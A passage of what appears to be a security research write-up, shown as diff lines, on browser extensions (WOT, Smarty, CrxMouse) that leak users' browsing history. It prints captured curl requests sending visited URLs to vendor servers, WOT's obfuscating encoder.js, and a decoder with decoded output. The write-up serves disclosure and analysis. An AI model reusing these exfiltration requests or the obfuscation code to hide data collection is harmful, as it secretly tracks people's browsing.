+href="https://www.kuketz-blog.de/wot-addon-wie-ein-browser-addon-seine-nutzer-ausspaeht/">blog</a>
+they reported similar type of leakage as it is now used in Similarweb
+extensions. That is yet another link that links WOT to Similarweb.</p>
+<div class="sourceCode" id="cb11"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="st">&#39;https://score.mywot.com/scores&#39;</span> <span class="dt">\</span></span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Accept: */*&#39;</span> <span class="dt">\</span></span>
+<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Accept-Language: en-GB,en-US;q=0.9,en;q=0.8&#39;</span> <span class="dt">\</span></span>
+<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Connection: keep-alive&#39;</span> <span class="dt">\</span></span>
+<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a>  <span class="at">-b</span> <span class="st">&#39;XXXXXX&#39;</span> <span class="dt">\</span></span>
+<span id="cb11-6"><a href="#cb11-6" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Origin: chrome-extension://bhmmomiinigofkjcapegjjndpbikblnp&#39;</span> <span class="dt">\</span></span>
+<span id="cb11-7"><a href="#cb11-7" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Sec-Fetch-Dest: empty&#39;</span> <span class="dt">\</span></span>
+<span id="cb11-8"><a href="#cb11-8" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Sec-Fetch-Mode: cors&#39;</span> <span class="dt">\</span></span>
+<span id="cb11-9"><a href="#cb11-9" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Sec-Fetch-Site: none&#39;</span> <span class="dt">\</span></span>
+<span id="cb11-10"><a href="#cb11-10" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Sec-Fetch-Storage-Access: active&#39;</span> <span class="dt">\</span></span>
+<span id="cb11-11"><a href="#cb11-11" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;User-Agent: XXXXXX&#39;</span> <span class="dt">\</span></span>
+<span id="cb11-12"><a href="#cb11-12" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;content-type: application/x-www-form-urlencoded&#39;</span> <span class="dt">\</span></span>
+<span id="cb11-13"><a href="#cb11-13" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;iged: XXXXXX&#39;</span> <span class="dt">\</span></span>
+<span id="cb11-14"><a href="#cb11-14" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;wid: XXXXXX&#39;</span> <span class="dt">\</span></span>
+<span id="cb11-15"><a href="#cb11-15" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;wot_trace_id: XXXXXX&#39;</span> <span class="dt">\</span></span>
+<span id="cb11-16"><a href="#cb11-16" aria-hidden="true" tabindex="-1"></a>  <span class="at">--data-raw</span> <span class="st">&#39;UGB2AB8...&#39;</span></span></code></pre></div>
+<p>This is the copy of <code>encoder.js</code> file.</p>
+<div class="sourceCode" id="cb12"><pre
+class="sourceCode js"><code class="sourceCode javascript"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> fp <span class="op">=</span> <span class="pp">require</span>(<span class="st">&#39;lodash/fp&#39;</span>)<span class="op">;</span></span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> isEmpty <span class="op">=</span> <span class="pp">require</span>(<span class="st">&#39;lodash/isEmpty&#39;</span>)<span class="op">;</span></span>
+<span id="cb12-3"><a href="#cb12-3" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> querystring <span class="op">=</span> <span class="pp">require</span>(<span class="st">&#39;querystring&#39;</span>)<span class="op">;</span></span>
+<span id="cb12-4"><a href="#cb12-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-5"><a href="#cb12-5" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> key <span class="op">=</span> <span class="vs">`91FMsA...`</span><span class="op">;</span></span>
+<span id="cb12-6"><a href="#cb12-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-7"><a href="#cb12-7" aria-hidden="true" tabindex="-1"></a><span class="kw">class</span> Encoder {</span>
+<span id="cb12-8"><a href="#cb12-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-9"><a href="#cb12-9" aria-hidden="true" tabindex="-1"></a>  <span class="kw">static</span> <span class="fu">encryptData</span>(input) {</span>
+<span id="cb12-10"><a href="#cb12-10" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> result <span class="op">=</span> <span class="st">&#39;&#39;</span><span class="op">;</span></span>
+<span id="cb12-11"><a href="#cb12-11" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> (<span class="kw">let</span> i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> i <span class="op">&lt;</span> input<span class="op">.</span><span class="at">length</span><span class="op">;</span> i<span class="op">++</span>) {</span>
+<span id="cb12-12"><a href="#cb12-12" aria-hidden="true" tabindex="-1"></a>      <span class="kw">const</span> charCode <span class="op">=</span> input<span class="op">.</span><span class="fu">charCodeAt</span>(i) <span class="op">^</span> key<span class="op">.</span><span class="fu">charCodeAt</span>(i <span class="op">%</span> key<span class="op">.</span><span class="at">length</span>)<span class="op">;</span></span>
+<span id="cb12-13"><a href="#cb12-13" aria-hidden="true" tabindex="-1"></a>      result <span class="op">+=</span> <span class="bu">String</span><span class="op">.</span><span class="fu">fromCharCode</span>(charCode)<span class="op">;</span></span>
+<span id="cb12-14"><a href="#cb12-14" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb12-15"><a href="#cb12-15" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> result<span class="op">;</span></span>
+<span id="cb12-16"><a href="#cb12-16" aria-hidden="true" tabindex="-1"></a>  }</span>
+<span id="cb12-17"><a href="#cb12-17" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-18"><a href="#cb12-18" aria-hidden="true" tabindex="-1"></a>  <span class="kw">static</span> <span class="fu">customEncode</span>(content) {</span>
+<span id="cb12-19"><a href="#cb12-19" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> (<span class="op">!</span>content) <span class="cf">return</span> <span class="st">&#39;&#39;</span><span class="op">;</span></span>
+<span id="cb12-20"><a href="#cb12-20" aria-hidden="true" tabindex="-1"></a>    <span class="kw">const</span> encodedContent <span class="op">=</span> <span class="bu">Buffer</span><span class="op">.</span><span class="fu">from</span>(<span class="bu">JSON</span><span class="op">.</span><span class="fu">stringify</span>(content))<span class="op">.</span><span class="fu">toString</span>(<span class="st">&#39;base64&#39;</span>)<span class="op">;</span></span>
+<span id="cb12-21"><a href="#cb12-21" aria-hidden="true" tabindex="-1"></a>    <span class="kw">const</span> reversed <span class="op">=</span> encodedContent<span class="op">.</span><span class="fu">split</span>(<span class="st">&#39;&#39;</span>)<span class="op">.</span><span class="fu">reverse</span>()<span class="op">.</span><span class="fu">join</span>(<span class="st">&#39;&#39;</span>)<span class="op">;</span></span>
+<span id="cb12-22"><a href="#cb12-22" aria-hidden="true" tabindex="-1"></a>    <span class="kw">const</span> xor <span class="op">=</span> <span class="kw">this</span><span class="op">.</span><span class="fu">encryptData</span>(reversed)<span class="op">;</span></span>
+<span id="cb12-23"><a href="#cb12-23" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="bu">Buffer</span><span class="op">.</span><span class="fu">from</span>(xor)<span class="op">.</span><span class="fu">toString</span>(<span class="st">&#39;base64&#39;</span>)<span class="op">;</span></span>
+<span id="cb12-24"><a href="#cb12-24" aria-hidden="true" tabindex="-1"></a>  }</span>
+<span id="cb12-25"><a href="#cb12-25" aria-hidden="true" tabindex="-1"></a>  </span>
+<span id="cb12-26"><a href="#cb12-26" aria-hidden="true" tabindex="-1"></a>  <span class="kw">static</span> <span class="fu">encodePairs</span>(pairs) {</span>
+<span id="cb12-27"><a href="#cb12-27" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> pairs<span class="op">.</span><span class="fu">map</span>((pair) <span class="kw">=&gt;</span> {</span>
+<span id="cb12-28"><a href="#cb12-28" aria-hidden="true" tabindex="-1"></a>      <span class="kw">const</span> [key<span class="op">,</span> value] <span class="op">=</span> pair<span class="op">;</span></span>
+<span id="cb12-29"><a href="#cb12-29" aria-hidden="true" tabindex="-1"></a>      <span class="cf">return</span> [</span>
+<span id="cb12-30"><a href="#cb12-30" aria-hidden="true" tabindex="-1"></a>        <span class="kw">this</span><span class="op">.</span><span class="fu">customEncode</span>(key)<span class="op">,</span></span>
+<span id="cb12-31"><a href="#cb12-31" aria-hidden="true" tabindex="-1"></a>        value <span class="op">?</span> <span class="kw">this</span><span class="op">.</span><span class="fu">customEncode</span>(value) <span class="op">:</span> <span class="st">&#39;&#39;</span></span>
+<span id="cb12-32"><a href="#cb12-32" aria-hidden="true" tabindex="-1"></a>      ]<span class="op">;</span></span>
+<span id="cb12-33"><a href="#cb12-33" aria-hidden="true" tabindex="-1"></a>    })<span class="op">;</span></span>
+<span id="cb12-34"><a href="#cb12-34" aria-hidden="true" tabindex="-1"></a>  }</span>
+<span id="cb12-35"><a href="#cb12-35" aria-hidden="true" tabindex="-1"></a>  </span>
+<span id="cb12-36"><a href="#cb12-36" aria-hidden="true" tabindex="-1"></a>  <span class="kw">static</span> <span class="fu">encode</span>(payload) {</span>
+<span id="cb12-37"><a href="#cb12-37" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> (<span class="kw">typeof</span> payload <span class="op">!==</span> <span class="st">&#39;object&#39;</span> <span class="op">||</span> <span class="fu">isEmpty</span>(payload)) {</span>
+<span id="cb12-38"><a href="#cb12-38" aria-hidden="true" tabindex="-1"></a>      <span class="cf">throw</span> <span class="kw">new</span> <span class="bu">Error</span>(<span class="st">&#39;Invalid payload&#39;</span>)<span class="op">;</span></span>
+<span id="cb12-39"><a href="#cb12-39" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb12-40"><a href="#cb12-40" aria-hidden="true" tabindex="-1"></a>  </span>
+<span id="cb12-41"><a href="#cb12-41" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> fp<span class="op">.</span><span class="fu">flow</span>(</span>
+<span id="cb12-42"><a href="#cb12-42" aria-hidden="true" tabindex="-1"></a>      fp<span class="op">.</span><span class="at">toPairs</span><span class="op">,</span></span>
+<span id="cb12-43"><a href="#cb12-43" aria-hidden="true" tabindex="-1"></a>      <span class="kw">this</span><span class="op">.</span><span class="at">encodePairs</span><span class="op">.</span><span class="fu">bind</span>(<span class="kw">this</span>)<span class="op">,</span></span>
+<span id="cb12-44"><a href="#cb12-44" aria-hidden="true" tabindex="-1"></a>      fp<span class="op">.</span><span class="at">fromPairs</span><span class="op">,</span></span>
+<span id="cb12-45"><a href="#cb12-45" aria-hidden="true" tabindex="-1"></a>      querystring<span class="op">.</span><span class="at">stringify</span><span class="op">,</span></span>
+<span id="cb12-46"><a href="#cb12-46" aria-hidden="true" tabindex="-1"></a>      <span class="kw">this</span><span class="op">.</span><span class="at">customEncode</span><span class="op">.</span><span class="fu">bind</span>(<span class="kw">this</span>)</span>
+<span id="cb12-47"><a href="#cb12-47" aria-hidden="true" tabindex="-1"></a>    )(payload)<span class="op">;</span></span>
+<span id="cb12-48"><a href="#cb12-48" aria-hidden="true" tabindex="-1"></a>  }</span>
+<span id="cb12-49"><a href="#cb12-49" aria-hidden="true" tabindex="-1"></a>}</span>
+<span id="cb12-50"><a href="#cb12-50" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb12-51"><a href="#cb12-51" aria-hidden="true" tabindex="-1"></a>module<span class="op">.</span><span class="at">exports</span> <span class="op">=</span> Encoder<span class="op">;</span></span></code></pre></div>
+<p>Reversing this encoding is not difficult, here is the reversed
+logic</p>
+<div class="sourceCode" id="cb13"><pre
+class="sourceCode js"><code class="sourceCode javascript"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> fp <span class="op">=</span> <span class="pp">require</span>(<span class="st">&#39;lodash/fp&#39;</span>)<span class="op">;</span></span>
+<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> querystring <span class="op">=</span> <span class="pp">require</span>(<span class="st">&#39;querystring&#39;</span>)<span class="op">;</span></span>
+<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> key <span class="op">=</span> <span class="vs">`91FMsAD...`</span><span class="op">;</span></span>
+<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a><span class="kw">class</span> Decoder {</span>
+<span id="cb13-7"><a href="#cb13-7" aria-hidden="true" tabindex="-1"></a>    <span class="kw">static</span> <span class="fu">decryptData</span>(input) {</span>
+<span id="cb13-8"><a href="#cb13-8" aria-hidden="true" tabindex="-1"></a>    <span class="kw">let</span> result <span class="op">=</span> <span class="st">&#39;&#39;</span><span class="op">;</span></span>
+<span id="cb13-9"><a href="#cb13-9" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> (<span class="kw">let</span> i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> i <span class="op">&lt;</span> input<span class="op">.</span><span class="at">length</span><span class="op">;</span> i<span class="op">++</span>) {</span>
+<span id="cb13-10"><a href="#cb13-10" aria-hidden="true" tabindex="-1"></a>      <span class="kw">const</span> charCode <span class="op">=</span> input<span class="op">.</span><span class="fu">charCodeAt</span>(i) <span class="op">^</span> key<span class="op">.</span><span class="fu">charCodeAt</span>(i <span class="op">%</span> key<span class="op">.</span><span class="at">length</span>)<span class="op">;</span></span>
+<span id="cb13-11"><a href="#cb13-11" aria-hidden="true" tabindex="-1"></a>      result <span class="op">+=</span> <span class="bu">String</span><span class="op">.</span><span class="fu">fromCharCode</span>(charCode)<span class="op">;</span></span>
+<span id="cb13-12"><a href="#cb13-12" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb13-13"><a href="#cb13-13" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> result<span class="op">;</span></span>
+<span id="cb13-14"><a href="#cb13-14" aria-hidden="true" tabindex="-1"></a>  }</span>
+<span id="cb13-15"><a href="#cb13-15" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-16"><a href="#cb13-16" aria-hidden="true" tabindex="-1"></a>  <span class="kw">static</span> <span class="fu">customDecode</span>(encodedContent) {</span>
+<span id="cb13-17"><a href="#cb13-17" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> (<span class="op">!</span>encodedContent) <span class="cf">return</span> <span class="st">&#39;&#39;</span><span class="op">;</span></span>
+<span id="cb13-18"><a href="#cb13-18" aria-hidden="true" tabindex="-1"></a>    <span class="kw">const</span> xorString <span class="op">=</span> <span class="bu">Buffer</span><span class="op">.</span><span class="fu">from</span>(encodedContent<span class="op">,</span> <span class="st">&#39;base64&#39;</span>)<span class="op">.</span><span class="fu">toString</span>(<span class="st">&#39;utf8&#39;</span>)<span class="op">;</span></span>
+<span id="cb13-19"><a href="#cb13-19" aria-hidden="true" tabindex="-1"></a>    <span class="kw">const</span> reversed <span class="op">=</span> <span class="kw">this</span><span class="op">.</span><span class="fu">decryptData</span>(xorString)<span class="op">;</span></span>
+<span id="cb13-20"><a href="#cb13-20" aria-hidden="true" tabindex="-1"></a>    <span class="kw">const</span> originalBase64 <span class="op">=</span> reversed<span class="op">.</span><span class="fu">split</span>(<span class="st">&#39;&#39;</span>)<span class="op">.</span><span class="fu">reverse</span>()<span class="op">.</span><span class="fu">join</span>(<span class="st">&#39;&#39;</span>)<span class="op">;</span></span>
+<span id="cb13-21"><a href="#cb13-21" aria-hidden="true" tabindex="-1"></a>    <span class="kw">const</span> jsonString <span class="op">=</span> <span class="bu">Buffer</span><span class="op">.</span><span class="fu">from</span>(originalBase64<span class="op">,</span> <span class="st">&#39;base64&#39;</span>)<span class="op">.</span><span class="fu">toString</span>(<span class="st">&#39;utf8&#39;</span>)<span class="op">;</span></span>
+<span id="cb13-22"><a href="#cb13-22" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="bu">JSON</span><span class="op">.</span><span class="fu">parse</span>(jsonString)<span class="op">;</span></span>
+<span id="cb13-23"><a href="#cb13-23" aria-hidden="true" tabindex="-1"></a>  }</span>
+<span id="cb13-24"><a href="#cb13-24" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-25"><a href="#cb13-25" aria-hidden="true" tabindex="-1"></a>  <span class="kw">static</span> <span class="fu">decode</span>(payload) {</span>
+<span id="cb13-26"><a href="#cb13-26" aria-hidden="true" tabindex="-1"></a>    <span class="cf">try</span> {</span>
+<span id="cb13-27"><a href="#cb13-27" aria-hidden="true" tabindex="-1"></a>      <span class="kw">const</span> queryString <span class="op">=</span> <span class="kw">this</span><span class="op">.</span><span class="fu">customDecode</span>(payload)<span class="op">;</span></span>
+<span id="cb13-28"><a href="#cb13-28" aria-hidden="true" tabindex="-1"></a>      <span class="kw">const</span> rawObject <span class="op">=</span> querystring<span class="op">.</span><span class="fu">parse</span>(queryString)<span class="op">;</span></span>
+<span id="cb13-29"><a href="#cb13-29" aria-hidden="true" tabindex="-1"></a>      <span class="kw">const</span> decodedObject <span class="op">=</span> {}<span class="op">;</span></span>
+<span id="cb13-30"><a href="#cb13-30" aria-hidden="true" tabindex="-1"></a>      <span class="bu">Object</span><span class="op">.</span><span class="fu">keys</span>(rawObject)<span class="op">.</span><span class="fu">forEach</span>((encKey) <span class="kw">=&gt;</span> {</span>
+<span id="cb13-31"><a href="#cb13-31" aria-hidden="true" tabindex="-1"></a>        <span class="kw">const</span> encValue <span class="op">=</span> rawObject[encKey]<span class="op">;</span></span>
+<span id="cb13-32"><a href="#cb13-32" aria-hidden="true" tabindex="-1"></a>        <span class="kw">const</span> decodedKey <span class="op">=</span> <span class="kw">this</span><span class="op">.</span><span class="fu">customDecode</span>(encKey)<span class="op">;</span></span>
+<span id="cb13-33"><a href="#cb13-33" aria-hidden="true" tabindex="-1"></a>        <span class="kw">const</span> decodedValue <span class="op">=</span> encValue <span class="op">?</span> <span class="kw">this</span><span class="op">.</span><span class="fu">customDecode</span>(encValue) <span class="op">:</span> <span class="kw">null</span><span class="op">;</span></span>
+<span id="cb13-34"><a href="#cb13-34" aria-hidden="true" tabindex="-1"></a>        decodedObject[decodedKey] <span class="op">=</span> decodedValue<span class="op">;</span></span>
+<span id="cb13-35"><a href="#cb13-35" aria-hidden="true" tabindex="-1"></a>      })<span class="op">;</span></span>
+<span id="cb13-36"><a href="#cb13-36" aria-hidden="true" tabindex="-1"></a>      <span class="cf">return</span> decodedObject<span class="op">;</span></span>
+<span id="cb13-37"><a href="#cb13-37" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-38"><a href="#cb13-38" aria-hidden="true" tabindex="-1"></a>    } <span class="cf">catch</span> (error) {</span>
+<span id="cb13-39"><a href="#cb13-39" aria-hidden="true" tabindex="-1"></a>      <span class="bu">console</span><span class="op">.</span><span class="fu">error</span>(<span class="st">&quot;Failed to decode payload:&quot;</span><span class="op">,</span> error)<span class="op">;</span></span>
+<span id="cb13-40"><a href="#cb13-40" aria-hidden="true" tabindex="-1"></a>      <span class="cf">return</span> <span class="kw">null</span><span class="op">;</span></span>
+<span id="cb13-41"><a href="#cb13-41" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb13-42"><a href="#cb13-42" aria-hidden="true" tabindex="-1"></a>  }</span>
+<span id="cb13-43"><a href="#cb13-43" aria-hidden="true" tabindex="-1"></a>}</span>
+<span id="cb13-44"><a href="#cb13-44" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-45"><a href="#cb13-45" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> payload <span class="op">=</span> <span class="st">&quot;UGB2AB...&quot;</span><span class="op">;</span> </span>
+<span id="cb13-46"><a href="#cb13-46" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb13-47"><a href="#cb13-47" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> data <span class="op">=</span> Decoder<span class="op">.</span><span class="fu">decode</span>(payload)<span class="op">;</span></span>
+<span id="cb13-48"><a href="#cb13-48" aria-hidden="true" tabindex="-1"></a><span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(data)<span class="op">;</span></span></code></pre></div>
+<p>Finally, the decoded data.</p>
+<pre><code>{
+  subtrgt: &#39;https://www.google.com/search?q=target&#39;,
+  sublast: &#39;https://www.google.com/search?q=previous&#39;,
+  subref: &#39;https://www.google.com/&#39;,
+  format: [ XXXXXX ],
+  nt: &#39;form_submit&#39;,
+  atm: &#39;exthead&#39;,
+  subsfwrd: [ XXXXXX ],
+  epochtime: XXXXXX,
+  ch: 6,
+  sg: &#39;XXXXXX&#39;,
+  id: &#39;XXXXXX&#39;,
+  vmt: 6,
+  dm: 21,
+  vv: 1,
+  ver: &#39;5.9.1&#39;,
+  delta: &#39;XXXXXX&#39;,
+  target: &#39;google.com&#39;
+}</code></pre>
+<h3 id="smarty">Smarty</h3>
+<p><code>extension_id: edjkecefjhobekadlkdkopkggdefpgfp</code></p>
+<p>The browser history is done directly using url parameters. Most of
+the extions use this simplest way of exfitration or by sending the URL
+within payload of POST request in plaintext.</p>
+<div class="sourceCode" id="cb15"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="st">&#39;https://api.joinsmarty.com/api/visit?country_code=US&amp;sp_user=0&amp;visited_url=https://www.google.com/search?q=target&amp;ei=XXXXXX&amp;ved=XXXXXX&amp;uact=5&amp;oq=target&amp;gs_lp=XXXXXX&amp;sclient=gws-wiz-serp&#39;</span> <span class="dt">\</span></span>
+<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;accept: */*&#39;</span> <span class="dt">\</span></span>
+<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;accept-language: en-GB,en-US;q=0.9,en;q=0.8&#39;</span> <span class="dt">\</span></span>
+<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;content-type: application/json&#39;</span> <span class="dt">\</span></span>
+<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a>  <span class="at">-b</span> <span class="st">&#39;XXXXXX&#39;</span> <span class="dt">\</span></span>
+<span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;priority: u=1, i&#39;</span> <span class="dt">\</span></span>
+<span id="cb15-7"><a href="#cb15-7" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;sec-fetch-dest: empty&#39;</span> <span class="dt">\</span></span>
+<span id="cb15-8"><a href="#cb15-8" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;sec-fetch-mode: cors&#39;</span> <span class="dt">\</span></span>
+<span id="cb15-9"><a href="#cb15-9" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;sec-fetch-site: none&#39;</span> <span class="dt">\</span></span>
+<span id="cb15-10"><a href="#cb15-10" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;sec-fetch-storage-access: active&#39;</span> <span class="dt">\</span></span>
+<span id="cb15-11"><a href="#cb15-11" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;user-agent: XXXXXX&#39;</span></span></code></pre></div>
+<h3 id="crxmouse-mouse-gestures">CrxMouse: Mouse Gestures</h3>
+<p><code>extension_id: jlgkpaicikihijadgifklkbpdajbkhjo</code></p>
+<div class="sourceCode" id="cb16"><pre
+class="sourceCode bash"><code class="sourceCode bash"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="ex">curl</span> <span class="st">&#39;https://api.mousegesturesapi.com/ms/gs&#39;</span> <span class="dt">\</span></span>
+<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Accept: */*&#39;</span> <span class="dt">\</span></span>
+<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Accept-Language: en-GB,en-US;q=0.9,en;q=0.8&#39;</span> <span class="dt">\</span></span>
+<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Connection: keep-alive&#39;</span> <span class="dt">\</span></span>
+<span id="cb16-5"><a href="#cb16-5" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Content-Type: application/x-www-form-urlencoded&#39;</span> <span class="dt">\</span></span>
+<span id="cb16-6"><a href="#cb16-6" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Origin: chrome-extension://jlgkpaicikihijadgifklkbpdajbkhjo&#39;</span> <span class="dt">\</span></span>
+<span id="cb16-7"><a href="#cb16-7" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Sec-Fetch-Dest: empty&#39;</span> <span class="dt">\</span></span>
+<span id="cb16-8"><a href="#cb16-8" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Sec-Fetch-Mode: cors&#39;</span> <span class="dt">\</span></span>
+<span id="cb16-9"><a href="#cb16-9" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Sec-Fetch-Site: none&#39;</span> <span class="dt">\</span></span>
+<span id="cb16-10"><a href="#cb16-10" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;Sec-Fetch-Storage-Access: active&#39;</span> <span class="dt">\</span></span>
+<span id="cb16-11"><a href="#cb16-11" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;User-Agent: XXXXXX&#39;</span> <span class="dt">\</span></span>
+<span id="cb16-12"><a href="#cb16-12" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;hiw8: www.google.com&#39;</span> <span class="dt">\</span></span>
+<span id="cb16-13"><a href="#cb16-13" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;x-session-init: s=XXXXXX&amp;v=6.3.4&amp;p=0&#39;</span> <span class="dt">\</span></span>
+<span id="cb16-14"><a href="#cb16-14" aria-hidden="true" tabindex="-1"></a>  <span class="at">-H</span> <span class="st">&#39;xr3r: 1767829778649&#39;</span> <span class="dt">\</span></span>
+<span id="cb16-15"><a href="#cb16-15" aria-hidden="true" tabindex="-1"></a>  <span class="at">--data-raw</span> <span class="st">&#39;abr=eyJxIj...&#39;</span></span></code></pre></div>
+<div class="sourceCode" id="cb17"><pre
+class="sourceCode js"><code class="sourceCode javascript"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> payload <span class="op">=</span> <span class="vs">`abr=eyJxIj...`</span><span class="op">;</span></span>
+<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> params <span class="op">=</span> <span class="kw">new</span> <span class="fu">URLSearchParams</span>(payload)<span class="op">;</span></span>
+<span id="cb17-4"><a href="#cb17-4" aria-hidden="true" tabindex="-1"></a>params<span class="op">.</span><span class="fu">forEach</span>((value<span class="op">,</span> key) <span class="kw">=&gt;</span> {</span>
+<span id="cb17-5"><a href="#cb17-5" aria-hidden="true" tabindex="-1"></a>    <span class="kw">const</span> decodedString <span class="op">=</span> <span class="bu">Buffer</span><span class="op">.</span><span class="fu">from</span>(value<span class="op">,</span> <span class="st">&#39;base64&#39;</span>)<span class="op">.</span><span class="fu">toString</span>(<span class="st">&#39;utf-8&#39;</span>)<span class="op">;</span></span>
+<span id="cb17-6"><a href="#cb17-6" aria-hidden="true" tabindex="-1"></a>    <span class="kw">const</span> parsedJson <span class="op">=</span> <span class="bu">JSON</span><span class="op">.</span><span class="fu">parse</span>(decodedString)<span class="op">;</span></span>
+<span id="cb17-7"><a href="#cb17-7" aria-hidden="true" tabindex="-1"></a>    <span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(<span class="vs">`URL param: </span><span class="sc">${</span>key<span class="sc">}</span><span class="vs">`</span>)<span class="op">;</span></span>
+<span id="cb17-8"><a href="#cb17-8" aria-hidden="true" tabindex="-1"></a>    <span class="bu">console</span><span class="op">.</span><span class="fu">dir</span>(parsedJson<span class="op">,</span> { <span class="dt">depth</span><span class="op">:</span> <span class="kw">null</span><span class="op">,</span> <span class="dt">colors</span><span class="op">:</span> <span class="kw">true</span> })<span class="op">;</span></span>
